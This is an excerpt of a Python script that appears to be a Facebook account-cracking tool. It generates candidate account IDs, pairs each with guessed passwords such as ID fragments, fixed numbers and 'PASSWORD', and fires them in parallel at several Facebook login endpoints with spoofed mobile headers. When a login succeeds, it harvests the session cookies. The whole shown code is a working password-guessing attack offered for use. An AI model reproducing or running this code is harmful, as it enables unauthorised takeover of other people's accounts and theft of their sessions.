...
def mix():
  ...
  with tred(max_workers=20) as king_xd:
    ...
    for guru in user:
      idf = kode+guru
      pwv = [idf[:6],idf[:8],idf,idf[4:],idf[2:],'57273200','57575751','59039200','57575752','PASSWORD']
      if 'm1' in mtd:king_xd.submit(m1,idf,pwv)
      elif 'm2' in mtd:king_xd.submit(m2,idf,pwv)
      elif 'm3' in mtd:king_xd.submit(m3,idf,pwv)
      elif 'm4' in mtd:king_xd.submit(m4,idf,pwv)
...
def m1(idf,pwv):
 ...
 try:
  for ps in pwv:
   ...
   free_fb = session.get('https://mtuoch.facebook.com').text
   log_data ={
   ...
   "pass":ps,
   "login":"Log In"}
   header_freefb =  {'authority':'mtuoch.facebook.com',
   'method': 'POST',
   'scheme': 'https',
   ...
   'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
   lo = session.post('https://mtuoch.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
...
def m2(idf,pwv):
 ...
 for pw in pwv:
  try:
   ses.headers.update({'Host': f'm.facebook.com','Connection': 'keep-alive','Content-Length': '{len(str(logn_data))}','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-model': '"GT-414XOP"','sec-ch-ua-mobile': '?1','User-Agent': ua3,'viewport-width': '400','Content-Type': 'application/x-www-form-urlencoded','X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),'sec-ch-ua-platform-version': '"9.0.0"','X-ASBD-ID': '129477','dpr': '1.8','sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua-platform': '"Android"','Accept': '*/*','Origin': f'https://{fb}.facebook.com','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': f'https://{fb}.facebook.com/login.php?skip_api_login=1&api_key=212500508799908&kid_directed_site=0&app_id=212500508799908&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D212500508799908%26redirect_uri%3Dhttps%253A%252F%252Fwww.codecademy.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D83fb97e0-a6e7-44b6-9da5-92a7b299a035%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.codecademy.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',})
   ...
   po = ses.post('https://mbasic.alpha.facebook.com/login.php?',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
   log_cookies=session.cookies.get_dict().keys()   
   if 'c_user' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    user = re.findall('c_user=(.*);xs', coki)[0]
...
def m5(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f'\r{P} [{animasi}-{H}M5{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
    sys.stdout.flush()
    try:
      for pw in pwv:
...
def m6(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f'\r{P} [{animasi}-{H}M8{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
    sys.stdout.flush()
    try:
      for pw in pwv:
            useragent = str(facebook_agent())
